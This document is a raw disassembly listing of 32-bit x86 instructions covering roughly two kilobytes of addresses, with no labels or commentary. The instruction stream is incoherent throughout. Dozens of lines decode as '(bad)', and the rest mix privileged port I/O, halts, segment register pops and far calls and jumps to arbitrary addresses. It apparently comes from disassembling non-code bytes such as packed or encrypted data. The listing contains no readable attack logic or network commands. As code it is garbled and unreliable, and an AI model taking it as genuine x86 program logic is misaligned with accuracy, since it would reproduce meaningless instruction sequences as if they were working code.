  41c1cc:	loop   0x41c220
  41c1ce:	mov    ss,WORD PTR [ebp+0x1c]
  41c1d1:	mov    ebx,0xab3f9e96
  41c1d6:	push   esp
  41c1d8:	lock mov ds:0x409fa4c,al
  41c1de:	inc    eax
  41c1df:	pop    ss
  41c1e0:	pop    ebx
  41c1e1:	(bad)  
  41c1e2:	retf   
  41c1e3:	mov    esp,0x3cb69621
  41c1e8:	lea    edx,ds:0x69929508
  41c1ee:	xchg   edi,eax
  41c1ef:	push   cs
  41c1f0:	iret   
  41c1f1:	leave  
  41c1f2:	mov    ecx,0xd88e9f30
  41c1f7:	adc    eax,0x6e0bd638
  41c1fc:	(bad)  
  41c1fd:	sbb    al,0xc2
  41c1ff:	dec    ebx
  41c200:	mov    dh,0xd4
  41c202:	mov    edi,0x24183b94
  41c207:	pop    ecx
  41c208:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c209:	add    eax,0x8e5684dd
  41c20e:	bndldx bnd0,[esp+ebp*8+0x50]
  41c213:	jbe    0x41c259
  41c215:	out    dx,al
  41c216:	inc    edx
  41c217:	aam    0xbe
  41c219:	mov    DWORD PTR [ebx+0x2f],esi
  41c21c:	mov    cl,BYTE PTR [edx-0x53506b07]
  41c222:	(bad)  
  41c224:	jmp    0xbc03a2bf
  41c229:	add    esi,0xffffffc9
  41c22c:	and    ebp,DWORD PTR [edi]
  41c22e:	jle    0x41c254
  41c230:	stc    
  41c231:	or     ax,0x7b3f
  41c235:	mov    edi,DWORD PTR [eax]
  41c237:	pop    ebx
  41c238:	mov    al,ds:0xc15c4b94
  41c23d:	js     0x41c27c
  41c23f:	fstp   TBYTE PTR [edi+0x499763b5]
  41c245:	mov    eax,ds:0x1989ab7e
  41c24a:	xchg   ebp,eax
  41c24b:	sbb    al,0xad
  41c24d:	push   ebp
  41c24e:	inc    esi
  41c24f:	mov    ds:0xfe662a53,al
  41c254:	pop    ds
  41c255:	pop    es
  41c256:	sahf   
  41c257:	aad    0xb7
  41c259:	imul   ebx,eax,0xffffffff
  41c25c:	(bad)  
  41c25d:	cmc    
  41c25e:	clc    
  41c25f:	call   0x92290c19
  41c264:	cmp    al,BYTE PTR [edi]
  41c266:	fst    st(1)
  41c268:	adc    eax,0x19c2ff1c
  41c26d:	(bad)
  41c270:	ss mov ecx,0x5f2a79dc
  41c276:	jp     0x41c216
  41c278:	pop    edx
  41c279:	out    0x69,al
  41c27b:	xchg   ebp,eax
  41c27c:	jo     0x41c2ae
  41c27e:	call   0xc71b:0x701018a2
  41c285:	aad    0xaf
  41c287:	hlt    
  41c288:	xchg   esi,eax
  41c289:	jae    0x41c301
  41c28b:	pushf  
  41c28c:	stos   DWORD PTR es:[edi],eax
  41c28d:	(bad)  
  41c28e:	fstp   TBYTE PTR [edx-0x6d90e52a]
  41c294:	mov    al,0xc8
  41c296:	pop    ss
  41c297:	aam    0xde
  41c299:	(bad)  [bx+si]
  41c29c:	in     al,0x52
  41c29e:	leave  
  41c29f:	xchg   DWORD PTR [edi+eax*4+0x32ab492],ebx
  41c2a6:	push   eax
  41c2a7:	dec    ebp
  41c2a8:	call   0x5410:0x95c7093b
  41c2af:	jle    0x41c2b5
  41c2b1:	xchg   edi,eax
  41c2b2:	out    dx,eax
  41c2b3:	jg     0x41c325
  41c2b5:	mov    al,ds:0xb0148065
  41c2ba:	jmp    0x7c48:0xa2b8d63f
  41c2c1:	mov    dh,0x12
  41c2c3:	mov    ebx,0xba518a36
  41c2c9:	in     al,dx
  41c2ca:	jnp    0x41c329
  41c2cc:	sar    eax,1
  41c2ce:	mov    ecx,0x2b18f176
  41c2d3:	and    DWORD PTR [esi],ebp
  41c2d5:	mov    al,0xb2
  41c2d7:	or     esp,DWORD PTR [ebx]
  41c2d9:	adc    eax,0x23943c82
  41c2de:	aas    
  41c2df:	lea    eax,[edx-0xe476f59]
  41c2e5:	outs   dx,BYTE PTR ds:[esi]
  41c2e6:	pop    es
  41c2e7:	adc    esi,DWORD PTR ds:0x3f6ca069
  41c2ed:	push   ebp
  41c2ee:	pop    esp
  41c2ef:	xchg   ebp,eax
  41c2f0:	retf   
  41c2f1:	push   0x6a
  41c2f3:	xor    BYTE PTR [ebp-0x18b0addb],al
  41c2f9:	imul   esp,DWORD PTR [ebp+ecx*4-0x3ce6b612],0xa925f5e2
  41c304:	push   ebx
  41c305:	sbb    DWORD PTR [edx],0xffffffe0
  41c308:	mov    BYTE PTR [eax*2+0x5c176661],ah
  41c30f:	xchg   ecx,eax
  41c310:	out    0x4d,eax
  41c312:	icebp  
  41c313:	(bad)  [edi-0x65fad484]
  41c319:	and    BYTE PTR [ebp-0x2c152b05],cl
  41c31f:	std    
  41c320:	cmp    al,0x36
  41c322:	lock inc DWORD PTR [ebp-0x1591393c]
  41c329:	js     0x41c2b0
  41c32b:	jp     0x41c39f
  41c32d:	xchg   edx,eax
  41c32e:	(bad)  
  41c32f:	stos   DWORD PTR es:[edi],eax
  41c330:	in     al,dx
  41c331:	lock fmul QWORD PTR [ebp-0x9]
  41c335:	stc    
  41c336:	inc    eax
  41c337:	inc    edi
  41c338:	cli    
  41c339:	daa    
  41c33a:	repz int3 
  41c33c:	push   ecx
  41c33d:	push   0x3b
  41c33f:	call   0xa8f5:0x3731bb7
  41c346:	cmp    eax,0x9d21b994
  41c34b:	mov    eax,0x7d2c7a7d
  41c350:	pop    ss
  41c351:	fwait
  41c352:	repnz lods eax,DWORD PTR ds:[esi]
  41c354:	mov    eax,0x2b3a9842
  41c359:	xor    ch,BYTE PTR [edx+ebp*8+0x5f6e754]
  41c360:	xchg   ebp,eax
  41c361:	jns    0x41c393
  41c363:	mov    ebp,0x2c7b65b8
  41c368:	jle    0x41c351
  41c36a:	sub    eax,0x2369bb04
  41c36f:	fimul  WORD PTR [edx-0xe]
  41c372:	stos   DWORD PTR es:[edi],eax
  41c373:	das    
  41c374:	pop    esi
  41c375:	jecxz  0x41c34f
  41c377:	or     al,0x6c
  41c379:	outs   dx,BYTE PTR ds:[esi]
  41c37a:	cmp    eax,0x308aa1cb
  41c37f:	jg     0x41c3de
  41c381:	nop
  41c382:	rol    bh,0x9a
  41c385:	rcl    DWORD PTR [esi-0x22],cl
  41c388:	xlat   BYTE PTR ds:[ebx]
  41c389:	scas   eax,DWORD PTR es:[edi]
  41c38a:	push   cs
  41c38b:	loopne 0x41c323
  41c38d:	pop    ds
  41c38e:	call   0x8ba0:0xf12cefe4
  41c395:	mov    WORD PTR [ecx],es
  41c397:	push   esp
  41c398:	adc    esp,DWORD PTR [esi]
  41c39a:	shl    BYTE PTR [edi+0x74],1
  41c39d:	popa   
  41c39e:	in     al,0x77
  41c3a0:	or     eax,0x40208932
  41c3a5:	jns    0x41c41c
  41c3a7:	retf   
  41c3a8:	mov    ds:0x1f4224ae,eax
  41c3ad:	(bad)  [edx+eax*8]
  41c3b0:	pop    esp
  41c3b1:	scas   eax,DWORD PTR es:[edi]
  41c3b2:	push   ss
  41c3b3:	jnp    0x41c3ca
  41c3b5:	mov    edi,0x632a2cfd
  41c3ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3bb:	bound  eax,QWORD PTR [eax-0x36446502]
  41c3c1:	mov    al,0xb1
  41c3c3:	mov    ds:0x11c54c24,eax
  41c3c8:	pop    edi
  41c3c9:	xchg   ecx,eax
  41c3ca:	push   esi
  41c3cb:	dec    esp
  41c3cc:	scas   eax,DWORD PTR es:[edi]
  41c3cd:	ins    BYTE PTR es:[edi],dx
  41c3ce:	cmp    bl,cl
  41c3d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3d1:	cs push ebp
  41c3d3:	push   esp
  41c3d4:	hlt    
  41c3d5:	add    BYTE PTR [ebp+0x3a],0x56
  41c3d9:	or     DWORD PTR [edx+0x13],esi
  41c3dc:	push   0x8be73533
  41c3e1:	dec    eax
  41c3e2:	into   
  41c3e3:	pop    edx
  41c3e4:	mov    ebp,0xada1cbab
  41c3ea:	in     eax,0xa3
  41c3ec:	in     eax,0xd8
  41c3ee:	mov    eax,ds:0x1d186bb8
  41c3f3:	inc    edx
  41c3f4:	or     edx,edx
  41c3f6:	pop    edx
  41c3f7:	jg     0x41c457
  41c3f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3fa:	call   0x755a64fb
  41c3ff:	data16 jmp 0x41c40c
  41c402:	cmp    esp,ebx
  41c404:	mov    ah,0xa5
  41c406:	inc    edi
  41c407:	test   BYTE PTR [ebx-0x4735b4b],bh
  41c40d:	mov    DWORD PTR [ebp+0x6a],edx
  41c410:	jg     0x41c42a
  41c412:	fidivr DWORD PTR [edi]
  41c414:	in     eax,0xaf
  41c416:	pop    esp
  41c417:	stos   BYTE PTR es:[edi],al
  41c418:	in     eax,dx
  41c419:	ret    
  41c41a:	and    edx,DWORD PTR [ebx-0x30]
  41c41d:	jge    0x41c44c
  41c41f:	stos   DWORD PTR es:[edi],eax
  41c420:	sbb    dl,BYTE PTR [ebx+0x5]
  41c423:	mov    esi,0xdf78430
  41c428:	xchg   dh,cl
  41c42a:	jecxz  0x41c45a
  41c42c:	gs nop
  41c42e:	lea    ebp,[eax+0x5]
  41c431:	aad    0xef
  41c433:	rsqrtps xmm4,xmm1
  41c436:	mov    dl,0xd8
  41c438:	dec    esp
  41c439:	or     ebp,DWORD PTR [ecx-0x6de31fb9]
  41c43f:	inc    edi
  41c440:	aad    0x88
  41c442:	fsub   DWORD PTR [edx+edx*2]
  41c445:	nop
  41c446:	in     eax,0xc7
  41c448:	inc    edi
  41c449:	mov    cl,0xa0
  41c44b:	xchg   ecx,eax
  41c44c:	ds fwait
  41c44e:	dec    edx
  41c44f:	fnstsw ax
  41c451:	cdq    
  41c452:	ja     0x41c477
  41c454:	gs addr16 xchg ebx,eax
  41c457:	sub    eax,0x50fa0658
  41c45c:	mov    ecx,0x85a7c79
  41c461:	add    BYTE PTR [ecx+0x5689dbfe],dh
  41c467:	add    DWORD PTR [ecx-0x376bc6a0],ecx
  41c46d:	mov    bh,0xee
  41c46f:	pop    edx
  41c470:	mov    edi,0x245ec955
  41c475:	xor    ch,BYTE PTR [edx-0x6a]
  41c478:	ror    BYTE PTR [edx-0x64c67d03],0xc4
  41c47f:	ins    BYTE PTR es:[edi],dx
  41c480:	xchg   ecx,eax
  41c481:	outs   dx,BYTE PTR ds:[esi]
  41c482:	sub    al,0xbc
  41c484:	enter  0xe1fc,0x57
  41c488:	das    
  41c489:	test   al,0x5f
  41c48b:	dec    edi
  41c48c:	mov    ah,0x65
  41c48e:	scas   al,BYTE PTR es:[edi]
  41c48f:	clc    
  41c490:	stos   DWORD PTR es:[edi],eax
  41c491:	sub    DWORD PTR [edi],eax
  41c493:	test   BYTE PTR [eax],bh
  41c495:	test   al,0x64
  41c497:	ins    DWORD PTR es:[edi],dx
  41c498:	stos   BYTE PTR es:[edi],al
  41c499:	push   esp
  41c49a:	xlat   BYTE PTR ds:[ebx]
  41c49b:	mov    ah,0x18
  41c49d:	mov    dh,0x90
  41c49f:	jb     0x41c42e
  41c4a1:	mov    esp,0xde122d9d
  41c4a6:	mov    esp,DWORD PTR [edx-0x1f]
  41c4a9:	push   eax
  41c4aa:	scas   al,BYTE PTR es:[edi]
  41c4ab:	jge    0x41c435
  41c4ad:	xor    ch,ch
  41c4af:	idiv   DWORD PTR [ebp+0x6445a0c6]
  41c4b5:	mov    WORD PTR [eax-0x2d84cf00],?
  41c4bb:	es mov ebx,0x2ae484
  41c4c1:	sbb    edx,esi
  41c4c3:	jo     0x41c47e
  41c4c5:	push   esp
  41c4c6:	test   al,0x85
  41c4c8:	test   eax,0x51f2f7c0
  41c4cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4ce:	push   edi
  41c4cf:	jno    0x41c53c
  41c4d1:	sub    al,0x4a
  41c4d3:	loope  0x41c52d
  41c4d5:	dec    ecx
  41c4d6:	in     eax,dx
  41c4d7:	ror    cl,0xbe
  41c4da:	fist   WORD PTR [edi-0x24]
  41c4dd:	scas   eax,DWORD PTR es:[edi]
  41c4de:	test   BYTE PTR [ecx-0x7400386f],0xbe
  41c4e5:	mov    eax,0x6af77840
  41c4ea:	ror    DWORD PTR [esi+0x77885408],0xc0
  41c4f1:	mov    bh,0xbb
  41c4f3:	(bad)  
  41c4f4:	pop    ebx
  41c4f5:	pop    ebp
  41c4f6:	and    al,0x12
  41c4f8:	mov    al,0x41
  41c4fa:	stc    
  41c4fb:	mov    ebx,ebx
  41c4fd:	rol    BYTE PTR [esi],0x9d
  41c500:	sbb    eax,0xfd5568e9
  41c505:	inc    edi
  41c506:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c507:	mov    al,0xfd
  41c509:	dec    edi
  41c50a:	xor    DWORD PTR [eax-0x583d844],esp
  41c510:	pop    esi
  41c511:	dec    esi
  41c512:	adc    edx,DWORD PTR [edi-0x34dfadee]
  41c518:	test   al,0x49
  41c51a:	dec    edx
  41c51b:	and    DWORD PTR [eax-0x46],ecx
  41c51e:	dec    esi
  41c51f:	stos   DWORD PTR es:[edi],eax
  41c520:	cmp    al,ch
  41c522:	fisttp DWORD PTR [ecx+ebx*2]
  41c525:	inc    eax
  41c526:	mov    dh,0xcc
  41c528:	rcl    DWORD PTR [edx+eax*4-0x8],0xc0
  41c52d:	lahf   
  41c52e:	out    0x70,eax
  41c530:	add    BYTE PTR [edx+0x43],al
  41c533:	adc    al,BYTE PTR [esi]
  41c535:	std    
  41c536:	sbb    BYTE PTR [ebx],bl
  41c538:	inc    edx
  41c539:	sub    eax,0x84d425d1
  41c53e:	gs retf 
  41c540:	scas   eax,DWORD PTR es:[edi]
  41c541:	rol    BYTE PTR [edi],cl
  41c543:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c544:	cli    
  41c545:	pop    ebx
  41c546:	jmp    0x9e2b9779
  41c54b:	inc    ebp
  41c54c:	mov    ds:0xc4b3445a,al
  41c551:	std    
  41c552:	cmp    al,0x79
  41c554:	add    esi,DWORD PTR [eax+0x31f8eb2b]
  41c55a:	(bad)  
  41c55b:	cmp    edx,DWORD PTR [edx-0x6d9e40d0]
  41c561:	and    DWORD PTR ds:0xffa01aa5,ecx
  41c567:	pop    ss
  41c568:	push   0x439f94c4
  41c56d:	mov    al,0x9d
  41c56f:	ss inc ebx
  41c571:	sbb    eax,0x3b40712e
  41c576:	xchg   esp,eax
  41c577:	or     eax,0x65121315
  41c57c:	es std 
  41c57e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c57f:	push   ds
  41c580:	stos   BYTE PTR es:[edi],al
  41c581:	or     eax,0x588bb8c8
  41c586:	mov    esi,0x90d96ef0
  41c58b:	jp     0x41c5ff
  41c58d:	inc    ecx
  41c58e:	inc    ebx
  41c58f:	inc    ebx
  41c590:	push   ebx
  41c591:	sub    ecx,DWORD PTR [ecx+0x3d]
  41c594:	mov    esp,0xd270e05
  41c599:	stos   BYTE PTR es:[edi],al
  41c59a:	pop    esi
  41c59b:	iret   
  41c59c:	aam    0xc3
  41c59e:	pushf  
  41c59f:	loop   0x41c53d
  41c5a1:	call   0x58635711
  41c5a6:	mov    cl,0x93
  41c5a8:	hlt    
  41c5a9:	push   esi
  41c5aa:	dec    ebx
  41c5ab:	repnz (bad) [edx-0x3e]
  41c5af:	add    BYTE PTR [edx-0x2d934883],ah
  41c5b5:	adc    bl,bl
  41c5b7:	sbb    esp,DWORD PTR [esi+edi*2+0x7f]
  41c5bb:	and    eax,0x3d0ce527
  41c5c0:	jmp    0x12e0:0x71c6846f
  41c5c7:	pop    ebp
  41c5c8:	or     al,0x7b
  41c5ca:	mov    ch,0xd
  41c5cc:	loop   0x41c581
  41c5ce:	scas   al,BYTE PTR es:[edi]
  41c5cf:	mov    cs,edi
  41c5d1:	pop    DWORD PTR [edi+edx*8]
  41c5d4:	adc    al,0xe1
  41c5d6:	dec    ecx
  41c5d7:	(bad)  
  41c5d8:	mov    bl,0x68
  41c5da:	pop    eax
  41c5db:	popa   
  41c5dc:	call   0x9aaf6829
  41c5e1:	jns    0x41c60c
  41c5e3:	fdiv   QWORD PTR [esi+0x31]
  41c5e6:	xlat   BYTE PTR ds:[ebx]
  41c5e7:	gs das 
  41c5e9:	stos   DWORD PTR es:[edi],eax
  41c5ea:	sub    ecx,DWORD PTR [edi-0x4e]
  41c5ed:	sbb    al,0x49
  41c5ef:	or     ah,BYTE PTR [ecx-0x21]
  41c5f2:	imul   ebx,DWORD PTR [edx-0x7f],0x8934c3e1
  41c5f9:	sub    al,0x9b
  41c5fb:	scas   al,BYTE PTR es:[edi]
  41c5fc:	out    0x45,eax
  41c5fe:	vmwrite edx,ebx
  41c601:	sub    eax,DWORD PTR [edi+eax*8]
  41c604:	sbb    esp,DWORD PTR [edx-0x9fe3ab7]
  41c60a:	scas   eax,DWORD PTR es:[edi]
  41c60b:	and    bl,BYTE PTR [ebx]
  41c60d:	(bad)  
  41c60f:	push   0xffffff8f
  41c611:	adc    WORD PTR [edi],ax
  41c614:	add    eax,DWORD PTR [edx]
  41c616:	mov    ebp,0xcbf0b4b
  41c61b:	outs   dx,BYTE PTR ds:[esi]
  41c61c:	inc    esi
  41c61d:	inc    ebx
  41c61e:	mov    esi,?
  41c620:	pop    ss
  41c621:	dec    edi
  41c622:	sahf   
  41c623:	les    edx,FWORD PTR [eax+0x70b8a074]
  41c629:	pop    ecx
  41c62a:	(bad)  
  41c62b:	ds inc esi
  41c62d:	cmc    
  41c62e:	xchg   esp,eax
  41c62f:	clc    
  41c630:	mov    eax,ds:0xb7210149
  41c635:	pusha  
  41c636:	xchg   esi,eax
  41c637:	not    BYTE PTR [eax]
  41c639:	pop    esp
  41c63a:	inc    ecx
  41c63b:	dec    edi
  41c63c:	or     al,0x7e
  41c63e:	jns    0x41c600
  41c640:	mov    al,0x84
  41c642:	leave  
  41c643:	adc    esi,DWORD PTR [esp+edi*8-0x56]
  41c647:	test   al,0x6f
  41c649:	cmp    BYTE PTR es:[esi-0x5b47a997],bl
  41c650:	dec    edi
  41c651:	fnstcw WORD PTR [edi+0x73]
  41c654:	xchg   esp,eax
  41c655:	lahf   
  41c656:	add    DWORD PTR [edi],esp
  41c658:	sub    eax,0x943af4c0
  41c65d:	(bad)  
  41c65e:	jnp    0x41c6d8
  41c660:	pop    ds
  41c661:	(bad)  
  41c662:	(bad)
  41c666:	pop    eax
  41c667:	not    BYTE PTR [esi]
  41c669:	int    0x67
  41c66b:	ins    DWORD PTR es:[edi],dx
  41c66c:	mov    dh,0x4c
  41c66e:	add    eax,0x4ea13329
  41c673:	fs xor al,0x3c
  41c676:	je     0x41c632
  41c678:	and    edi,DWORD PTR [edx]
  41c67a:	jg     0x41c62e
  41c67c:	mov    ah,0xa1
  41c67e:	outs   dx,BYTE PTR ds:[esi]
  41c67f:	ror    dh,cl
  41c681:	loopne 0x41c6da
  41c683:	add    esp,DWORD PTR [esi-0x3c]
  41c686:	cs cld 
  41c688:	jo     0x41c663
  41c68a:	fucomip st,st(1)
  41c68c:	xor    bh,0x54
  41c68f:	js     0x41c6ed
  41c691:	cmp    edi,edx
  41c693:	mov    esi,0x4c4dcb23
  41c698:	mov    eax,ds:0x7d723935
  41c69d:	inc    eax
  41c69e:	add    DWORD PTR [edi-0x36],esi
  41c6a1:	aas    
  41c6a2:	nop
  41c6a3:	add    ecx,DWORD PTR [ebp+0x6de3fe84]
  41c6a9:	pop    esi
  41c6aa:	enter  0x1d28,0xb4
  41c6ae:	cli    
  41c6af:	das    
  41c6b0:	(bad)  
  41c6b1:	mov    ecx,0x7e720251
  41c6b6:	imul   ebx,DWORD PTR [eax-0x2a14c6d4],0xffffffe8
  41c6bd:	mov    eax,0x901208d0
  41c6c2:	fnstcw WORD PTR [ebx+ecx*8-0x718350e2]
  41c6c9:	mov    esp,0x3e2c529c
  41c6ce:	xlat   BYTE PTR ds:[ebx]
  41c6cf:	dec    ecx
  41c6d0:	outs   dx,BYTE PTR ds:[esi]
  41c6d1:	inc    ecx
  41c6d2:	sbb    BYTE PTR [edx+ecx*4+0x7147c5c7],dh
  41c6d9:	test   BYTE PTR ds:0xc198e860,0x4f
  41c6e0:	lahf   
  41c6e1:	das    
  41c6e2:	(bad)  
  41c6e3:	inc    eax
  41c6e4:	add    cl,BYTE PTR [eax-0x23d87219]
  41c6ea:	nop
  41c6eb:	ret    
  41c6ec:	shl    BYTE PTR [edx+0x6063db54],cl
  41c6f2:	in     al,dx
  41c6f3:	or     al,0xbd
  41c6f5:	or     ecx,0xffffff9e
  41c6f8:	pop    ebx
  41c6f9:	sbb    al,0x96
  41c6fb:	jge    0x41c6dd
  41c6fd:	add    al,0x42
  41c6ff:	xor    BYTE PTR [edi-0x2e29ff8],cl
  41c705:	leave  
  41c706:	imul   esp,eax,0xe1a5f810
  41c70c:	ins    BYTE PTR es:[edi],dx
  41c70d:	ret    
  41c70e:	(bad)  
  41c70f:	xchg   bx,ax
  41c711:	push   ebx
  41c712:	push   cs
  41c713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c714:	loope  0x41c718
  41c716:	fisub  WORD PTR [ebx]
  41c718:	cmp    al,0x9d
  41c71a:	adc    DWORD PTR [eax],edx
  41c71c:	pop    ecx
  41c71d:	fs js  0x41c77e
  41c720:	and    al,0x49
  41c722:	pushf  
  41c723:	retf   
  41c724:	imul   ecx,DWORD PTR [esi-0x71],0xba2469a8
  41c72b:	clc    
  41c72c:	cmc    
  41c72d:	xchg   ebp,eax
  41c72e:	in     eax,dx
  41c72f:	mov    bl,0x66
  41c731:	adc    eax,0xc774d109
  41c736:	cld    
  41c737:	xchg   ebp,eax
  41c738:	cmp    dh,BYTE PTR [ebp-0xc]
  41c73b:	cmp    ebp,DWORD PTR [esi-0x2ea48fd6]
  41c741:	lods   eax,DWORD PTR ds:[esi]
  41c742:	fwait
  41c743:	loopne 0x41c75e
  41c745:	test   DWORD PTR [ebp+0x5],ebx
  41c748:	lea    eax,[eax+0x34]
  41c74b:	jns    0x41c769
  41c74d:	fild   DWORD PTR [eax-0x22]
  41c750:	or     ebx,DWORD PTR [esi-0x57]
  41c753:	ret    0x47cc
  41c756:	xchg   ebx,eax
  41c757:	xor    BYTE PTR [esi],ah
  41c759:	xchg   ebp,eax
  41c75a:	addr16 out 0xff,eax
  41c75d:	jle    0x41c775
  41c75f:	std    
  41c760:	rcr    BYTE PTR [eax],cl
  41c762:	mov    DWORD PTR [edi+edx*2],ebp
  41c765:	adc    eax,0xc42d1532
  41c76a:	push   0x2d8e0d10
  41c76f:	ins    BYTE PTR es:[edi],dx
  41c770:	fnsave [ecx-0x77e29e44]
  41c776:	(bad)  
  41c777:	add    al,0x6f
  41c779:	xchg   DWORD PTR [eax],ecx
  41c77b:	and    eax,0x9336f0a0
  41c780:	pop    esi
  41c781:	sub    DWORD PTR [eax+0x3fa89113],0x8c73887
  41c78b:	gs aas 
  41c78d:	inc    esp
  41c78e:	int3   
  41c78f:	scas   al,BYTE PTR es:[edi]
  41c790:	imul   edx,DWORD PTR [eax-0x1d],0x4a
  41c794:	in     eax,0x75
  41c796:	xor    esi,ebx
  41c798:	addr16 pop ss
  41c79a:	fistp  WORD PTR [esi-0xb2cb1c6]
  41c7a0:	add    eax,0x5aad15e
  41c7a5:	call   0xf0fbb32a
  41c7aa:	test   eax,0x3eb62e60
  41c7af:	jae    0x41c7af
  41c7b1:	out    0xf7,al
  41c7b3:	mov    dl,0xd4
  41c7b5:	cmp    BYTE PTR [edi+0xb],bl
  41c7b8:	loope  0x41c784
  41c7ba:	xor    eax,0xdfb986ed
  41c7bf:	retf   0x73c2
  41c7c2:	ret    
  41c7c3:	jmp    0x2025:0xaa71e686
  41c7ca:	pop    es
  41c7cb:	(bad)  
  41c7cd:	mov    DWORD PTR fs:[ebp-0x721f9f63],esp
  41c7d4:	inc    esi
  41c7d5:	inc    eax
  41c7d6:	ins    DWORD PTR es:[edi],dx
  41c7d7:	in     al,0xf9
  41c7d9:	mov    eax,0xae0e57e7
  41c7de:	shl    dh,0x23
  41c7e1:	xchg   edx,eax
  41c7e2:	cdq    
  41c7e3:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41c7e5:	fidiv  WORD PTR [edi]
  41c7e7:	add    BYTE PTR [esi+0x7246194d],0x22
  41c7ee:	push   esi
  41c7ef:	aad    0x65
  41c7f1:	test   DWORD PTR [edi-0x2a4d2b72],ecx
  41c7f7:	test   DWORD PTR [esi+0x47],0xa2d2bde0
  41c7fe:	mov    dh,0xb9
  41c800:	add    ebp,eax
  41c802:	pop    ds
  41c803:	jg     0x41c7ab
  41c805:	scas   al,BYTE PTR es:[edi]
  41c806:	mov    ?,eax
  41c808:	ficom  DWORD PTR [ecx+esi*8+0x54]
  41c80c:	jecxz  0x41c860
  41c80e:	mov    edi,0x8ceb5a69
  41c813:	pusha  
  41c814:	fcmovnbe st,st(1)
  41c816:	rol    bh,0x45
  41c819:	cdq    
  41c81a:	inc    eax
  41c81b:	dec    ebp
  41c81c:	cmp    ah,BYTE PTR [edx]
  41c81e:	mov    BYTE PTR [esi],dh
  41c820:	sbb    eax,DWORD PTR [ecx-0x4f]
  41c823:	outs   dx,BYTE PTR ds:[esi]
  41c824:	div    al
  41c826:	or     DWORD PTR [ebx+0x2f],0xa2deb75f
  41c82d:	cmp    dh,bh
  41c82f:	je     0x41c86b
  41c831:	call   0xb3e101d9
  41c836:	stc    
  41c837:	jne    0x41c7d6
  41c839:	stos   BYTE PTR es:[edi],al
  41c83a:	jbe    0x41c7ef
  41c83c:	fld    TBYTE PTR [edi-0x9]
  41c83f:	mov    ch,0x48
  41c841:	mov    esp,0xca648008
  41c846:	je     0x41c82e
  41c848:	add    eax,0x8eb4f438
  41c84d:	iret   
  41c84e:	ins    BYTE PTR es:[edi],dx
  41c84f:	mov    al,0x96
  41c851:	inc    ebx
  41c852:	jns    0x41c8a3
  41c854:	int    0x9c
  41c856:	arpl   WORD PTR [edx],di
  41c858:	jecxz  0x41c8b8
  41c85a:	or     al,0x3b
  41c85c:	mov    fs,edi
  41c85e:	ds xor al,0x50
  41c861:	jb     0x41c827
  41c863:	adc    al,0xaa
  41c865:	idiv   DWORD PTR [ebx]
  41c867:	sub    eax,0xff870575
  41c86c:	or     ebp,DWORD PTR [edx]
  41c86e:	jae    0x41c832
  41c870:	bnd jp 0x41c853
  41c873:	sbb    ecx,eax
  41c875:	cld    
  41c876:	call   0x285a:0xe02ad44b
  41c87d:	pusha  
  41c87e:	ins    BYTE PTR es:[edi],dx
  41c87f:	xchg   BYTE PTR [eax],al
  41c881:	mov    al,ds:0xb7508cb0
  41c886:	dec    ecx
  41c887:	outs   dx,BYTE PTR ds:[esi]
  41c888:	add    bh,BYTE PTR [edi-0x51605bff]
  41c88e:	push   ebx
  41c88f:	push   esp
  41c890:	jmp    0x41c882
  41c892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c893:	push   ds
  41c894:	jecxz  0x41c8d2
  41c896:	mov    bh,0x7d
  41c898:	cmc    
  41c899:	popf   
  41c89a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c89b:	or     dh,BYTE PTR [ecx+0xb85c4a]
  41c8a1:	not    BYTE PTR [edx-0x4b31fbcf]
  41c8a7:	mov    ds:0x9fd526cd,al
  41c8ac:	test   ch,bl
  41c8ae:	std    
  41c8af:	imul   edx,DWORD PTR [eax],0x61c296a4
  41c8b5:	inc    ebp
  41c8b6:	leave  
  41c8b7:	(bad)  
  41c8b8:	mov    esp,0xa320a94a
  41c8bd:	push   0x37
  41c8bf:	lds    esi,FWORD PTR [esi+0x16]
  41c8c2:	sbb    al,0xb1
  41c8c4:	mov    esi,0xa28653f6
  41c8c9:	ins    BYTE PTR es:[edi],dx
  41c8ca:	out    0x76,al
  41c8cc:	push   eax
  41c8cd:	mov    bl,BYTE PTR [ebp+0x4f4b68c8]
  41c8d3:	fisubr DWORD PTR [esi+0x7a]
  41c8d6:	aam    0xec
  41c8d8:	jl     0x41c899
  41c8da:	or     BYTE PTR [esi-0x2e],ch
  41c8dd:	or     ecx,DWORD PTR [edi-0x2e]
  41c8e0:	mov    cl,0x73
  41c8e2:	pushf  
  41c8e3:	dec    esp
  41c8e4:	push   ss
  41c8e5:	int    0x80
  41c8e7:	dec    eax
  41c8e9:	mov    esi,0xa18d0168
  41c8ee:	mov    ah,0x3a
  41c8f0:	ins    BYTE PTR es:[edi],dx
  41c8f1:	in     eax,0x93
  41c8f3:	push   edx
  41c8f4:	sbb    eax,0x4a6efbbb
  41c8f9:	shl    BYTE PTR [ebp-0x4f5a7dd],cl
  41c8ff:	test   al,0xcf
  41c901:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c902:	retf   0x3765
  41c905:	adc    dl,BYTE PTR [esi]
  41c907:	xor    bh,BYTE PTR ds:0x4bf28736
  41c90d:	sub    DWORD PTR [ecx-0x53],esi
  41c910:	push   0xffffffb7
  41c912:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c913:	test   BYTE PTR [esp+esi*1-0x58],dl
  41c917:	and    al,0xb6
  41c919:	in     eax,0xc2
  41c91b:	repz shl edi,1
  41c91e:	sbb    dl,cl
  41c920:	into   
  41c921:	fsubrp st(6),st
  41c923:	call   0x940e3e0e
  41c928:	mov    ds:0x530d2df9,al
  41c92d:	xchg   esi,eax
  41c92e:	jmp    0x41c9a9
  41c930:	and    BYTE PTR [ebx+0x68],0xe5
  41c934:	jbe    0x41c920
  41c936:	cdq    
  41c937:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41c939:	(bad)  
